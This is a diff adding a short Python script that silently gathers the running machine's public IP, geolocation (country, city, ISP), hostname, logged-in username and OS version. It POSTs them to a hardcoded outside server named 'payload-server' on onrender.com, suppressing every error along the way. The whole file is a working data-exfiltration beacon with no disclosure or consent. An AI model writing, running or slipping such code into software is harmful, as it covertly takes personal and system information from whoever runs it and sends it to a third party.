@@ -1,0 +1,46 @@
+import os
+import sys
+import platform
+import requests
+import json
+import socket
+from datetime import datetime
+
+YOUR_SERVER = "https://payload-server-fmyh.onrender.com"
+
+def get_ip_info():
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
+        return {
+            'ip': ip,
+            'country': geo.get('country'),
+            'city': geo.get('city'),
+            'isp': geo.get('isp')
+        }
+    except:
+        return {}
+
+def get_system_info():
+    return {
+        'hostname': socket.gethostname(),
+        'user': os.getlogin(),
+        'os': platform.platform()
+    }
+
+def send_data(data):
+    try:
+        requests.post(f"{YOUR_SERVER}/data", json=data, timeout=5)
+    except:
+        pass
+
+def main():
+    data = {
+        'timestamp': str(datetime.now()),
+        'ip': get_ip_info(),
+        'system': get_system_info()
+    }
+    send_data(data)
+
+if __name__ == "__main__":
+    main()
